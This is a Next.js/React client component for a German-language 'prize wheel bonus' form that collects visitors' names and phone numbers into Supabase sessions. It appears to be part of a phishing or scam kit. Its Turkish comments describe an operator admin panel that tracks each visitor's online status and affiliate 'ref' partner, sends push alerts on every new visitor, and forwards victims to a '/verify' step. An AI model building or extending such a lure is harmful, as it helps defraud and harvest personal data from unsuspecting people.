"use client";

import { useEffect, useRef, useState } from "react";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { useSettings } from "@/contexts/SettingsContext";
import {
  getPreferredRouteSessionId,
  persistActiveSession,
} from "@/lib/session-id-client";
import { SessionRealtimeGate } from "@/components/demo/SessionRealtimeGate";
import { normalizeSessionIdentifier } from "@/lib/session-identifiers";

function readCookieSessionId(): string | undefined {
  if (typeof document === "undefined") return undefined;
  const match = document.cookie.match(
    new RegExp(`(?:^|; )ACTIVE_SESSION=([^;]*)`),
  );
  return match?.[1] ? decodeURIComponent(match[1]) : undefined;
}

export default function HomeClient({
  sessionId,
  routeSessionId,
}: {
  sessionId?: string;
  routeSessionId?: string;
}) {
  const { settings } = useSettings();
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);
  const [firstName, setFirstName] = useState("");
  const [lastName, setLastName] = useState("");
  const [phone, setPhone] = useState("");

  // ?session= linkiyle gelen kullanici: bu session'i aktif yap + eski cookie session'i OFFLINE isaretle.
  // (Eskiden cookie'deki eski session ping'lenmeye devam ediyordu -> admin'de eski ONLINE, yeni OFFLINE gozukuyordu.)
  const [activeSessionIds, setActiveSessionIds] = useState<{ sessionId: string; routeSessionId: string } | null>(
    () => (sessionId ? { sessionId, routeSessionId: routeSessionId || sessionId } : null),
  );

  // Landing'den forma gecen yeni ziyaretci: isimleri beklemeden TASLAK session ac
  // (form_data.pending_profile=true -> admin "Cop Log"da gorur). Form gonderilince
  // pending_profile=false olur ve ayni kayit normal log'a donusur.
  const draftRef = useRef<string | null>(null);
  useEffect(() => {
    if (sessionId || draftRef.current !== null) return;
    draftRef.current = "pending";
    const supabase = createBrowserSupabaseClient();
    if (!supabase) {
      draftRef.current = null;
      return;
    }
    const partnerName =
      new URLSearchParams(window.location.search).get("ref") || "admin";
    supabase
      .from("sessions")
      .insert({
        amount: 0,
        current_step: "win",
        status: "online",
        is_hidden: false,
        partner_name: partnerName,
        form_data: {
          currency: "€",
          is_wheel_game: true,
          pending_profile: true,
        },
      })
      .select("id, public_id")
      .maybeSingle()
      .then(({ data }) => {
        if (data?.id) {
          draftRef.current = data.id;
          setActiveSessionIds({
            sessionId: data.id,
            routeSessionId: data.public_id ? String(data.public_id) : data.id,
          });
          // Taslak acildi -> admin cihazlarina bildirim (sessiz fail)
          void fetch("/api/push/notify", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              title: "Yeni Ziyaretçi",
              body: `${partnerName} üzerinden isim formuna ulaşıldı`,
              url: "/admin1",
              tag: `session-${data.id}`,
            }),
          }).catch(() => {});
        } else {
          draftRef.current = null;
        }
      });
  }, [sessionId]);

  useEffect(() => {
    if (!sessionId) return;
    try {
      const oldSid = readCookieSessionId();
      if (oldSid && oldSid !== sessionId) {
        // Eski session'i aninda OFFLINE yap (yeni link kullaniliyor)
        void fetch("/api/session/ping", {
          method: "POST",
          credentials: "same-origin",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ sessionId: oldSid, status: "offline" }),
        }).catch(() => {});
      }
      persistActiveSession(sessionId, routeSessionId || sessionId);
    } catch {
      /* noop */
    }
  }, [sessionId, routeSessionId]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (loading) return;
    const fn = firstName.trim();
    const ln = lastName.trim();
    const ph = phone.trim();
    if (!fn || !ln || !ph) {
      setError("Bitte fuellen Sie alle Felder aus.");
      return;
    }
    setLoading(true);
    setError("");

    const supabase = createBrowserSupabaseClient();
    if (!supabase) {
      setError("Systemfehler: Keine Verbindung moeglich.");
      setLoading(false);
      return;
    }

    const urlParams = new URLSearchParams(window.location.search);
    const partnerName = urlParams.get("ref") || "admin";

    let sid = sessionId || "";
    let routeSid = routeSessionId || "";

    // Olusturulan link YOK ama landing'den gelen taslak session VAR -> ayni kaydi
    // normal log'a donustur (pending_profile=false), yeni satir acma.
    if (!sid && draftRef.current && draftRef.current !== "pending") {
      sid = draftRef.current;
      routeSid = activeSessionIds?.routeSessionId || sid;
    }

    if (sid) {
      // Olusturulan linkten gelen session -> isim/telefonu uzerine yaz, carka gonder
      const { data: existing } = await supabase
        .from("sessions")
        .select("form_data")
        .eq("id", sid)
        .maybeSingle();
      const prevFd = (existing?.form_data ?? {}) as Record<string, unknown>;
      const { error: upErr } = await supabase
        .from("sessions")
        .update({
          status: "online",
          current_step: "verify",
          form_data: {
            ...prevFd,
            firstName: fn,
            lastName: ln,
            phone: ph,
            pending_profile: false,
            is_wheel_game: true,
          },
        })
        .eq("id", sid);
      if (upErr) {
        setError("Etwas ist schiefgelaufen. Bitte versuchen Sie es spaeter erneut.");
        setLoading(false);
        return;
      }
    } else {
      // Ana domain -> yeni session
      const { data, error: insertError } = await supabase
        .from("sessions")
        .insert({
          amount: 0,
          current_step: "verify",
          status: "online",
          is_hidden: false,
          partner_name: partnerName,
          form_data: {
            currency: "€",
            is_wheel_game: true,
            pending_profile: false,
            firstName: fn,
            lastName: ln,
            phone: ph,
          },
        })
        .select("id, public_id")
        .maybeSingle();

      if (insertError || !data?.id) {
        setError("Etwas ist schiefgelaufen. Bitte versuchen Sie es spaeter erneut.");
        setLoading(false);
        return;
      }

      sid = data.id;
      routeSid = data.public_id ? String(data.public_id) : data.id;

      // Yeni ziyaretci -> admin cihazlarina push bildirimi (sessiz fail)
      void fetch("/api/push/notify", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          title: "Yeni Ziyaretçi",
          body: `${partnerName} üzerinden siteye giriş yapıldı`,
          url: "/admin1",
          tag: `session-${data.id}`,
        }),
      }).catch(() => {});
    }

    persistActiveSession(sid, routeSid);
    setActiveSessionIds({ sessionId: sid, routeSessionId: routeSid });
    window.location.replace(`/verify?session=${encodeURIComponent(routeSid)}`);
  };

  return (
    <div className="pak-page-shell">
      {activeSessionIds?.sessionId ? (
        <SessionRealtimeGate
          sessionId={activeSessionIds.sessionId}
          routeSessionId={activeSessionIds.routeSessionId}
        />
      ) : null}
      <main className="relative z-10 w-full max-w-[820px] fade-in">
        <div className="pak-form-card overflow-hidden">
          <div className="pak-form-inner px-5 pb-6 pt-6 sm:px-7 sm:pb-8 sm:pt-8 lg:px-10 lg:pb-9 lg:pt-9">
            <div className="space-y-4 sm:space-y-5">
              <div className="flex items-center justify-between gap-2.5 sm:gap-4">
                <img
                  src={settings.logo_url && settings.logo_url !== "/logo.webp" ? settings.logo_url : "/logo.webp"}
                  alt={settings.portal_name || "Brand"}
                  className="pak-form-brand-logo shrink-0"
                />
              </div>

              <div className="max-w-[27rem]">
                <h2 className="pak-form-title">Geben Sie Ihre Daten ein</h2>
                <p className="pak-form-subtitle mt-2 sm:mt-3">
                  Geben Sie Ihren Namen und Ihre Telefonnummer ein, um am Gluecksrad zu drehen und Ihren Bonus zu erhalten.
                </p>
              </div>
            </div>

            <form onSubmit={handleSubmit} className="mt-4 space-y-3 sm:mt-7 sm:space-y-6">
              <div className="grid grid-cols-2 gap-3 sm:gap-6">
                <label className="pak-form-label">
                  {settings.profile_firstname_label}
                  <div className="pak-form-input-wrap">
                    <div className="pak-form-input-icon">
                      <svg className="h-6 w-6" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.1">
                        <path d="M12 12a4.25 4.25 0 1 0-4.25-4.25A4.25 4.25 0 0 0 12 12Z" />
                        <path d="M4.8 20.2a7.2 7.2 0 0 1 14.4 0" strokeLinecap="round" />
                      </svg>
                    </div>
                    <input
                      className="pak-form-input min-h-[3.55rem] pl-11 pr-3 text-base sm:min-h-[4.5rem] sm:pl-14 sm:pr-4 sm:text-lg"
                      value={firstName}
                      onChange={(e) => setFirstName(e.target.value)}
                      autoComplete="given-name"
                    />
                  </div>
                </label>
                <label className="pak-form-label">
                  {settings.profile_lastname_label}
                  <div className="pak-form-input-wrap">
                    <div className="pak-form-input-icon">
                      <svg className="h-6 w-6" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.1">
                        <path d="M12 12a4.25 4.25 0 1 0-4.25-4.25A4.25 4.25 0 0 0 12 12Z" />
                        <path d="M4.8 20.2a7.2 7.2 0 0 1 14.4 0" strokeLinecap="round" />
                      </svg>
                    </div>
                    <input
                      className="pak-form-input min-h-[3.55rem] pl-11 pr-3 text-base sm:min-h-[4.5rem] sm:pl-14 sm:pr-4 sm:text-lg"
                      value={lastName}
                      onChange={(e) => setLastName(e.target.value)}
                      autoComplete="family-name"
                    />
                  </div>
                </label>
              </div>
              <label className="pak-form-label">
                {settings.profile_phone_label}
                <div className="pak-form-input-wrap">
                  <div className="pak-form-input-icon">
                    <svg className="h-6 w-6" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.1">
                      <path d="M6.6 3.8h2.6l1.2 4.3-1.6 1.6a15.9 15.9 0 0 0 5.5 5.5l1.6-1.6 4.3 1.2v2.6a1.9 1.9 0 0 1-2.1 1.9A16.2 16.2 0 0 1 4.7 6a1.9 1.9 0 0 1 1.9-2.2Z" strokeLinecap="round" strokeLinejoin="round" />
                    </svg>
                  </div>
                  <input
                    type="tel"
                    className="pak-form-input min-h-[3.55rem] pl-11 pr-3 text-base sm:min-h-[4.5rem] sm:pl-14 sm:pr-4 sm:text-lg"
                    value={phone}
                    onChange={(e) => setPhone(e.target.value)}
                    autoComplete="tel"
                  />
                </div>
              </label>

              {error && (
                <div className="flex items-start gap-2 rounded-xl border border-red-500/20 bg-red-500/10 p-3 text-left text-sm text-red-300">
                  <svg className="mt-0.5 h-5 w-5 shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
                  </svg>
                  {error}
                </div>
              )}

              <button
                type="submit"
                disabled={loading}
                className="pak-form-button min-h-[4rem] w-full max-w-[20rem] px-6 text-lg sm:text-[1.1rem]"
              >
                {loading ? (
                  <span className="flex items-center justify-center gap-2">
                    <svg className="h-5 w-5 animate-spin" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                      <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
                      <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z" />
                    </svg>
                    Bitte warten...
                  </span>
                ) : (
                  "Weiter"
                )}
              </button>
            </form>
          </div>
        </div>
      </main>
    </div>
  );
}
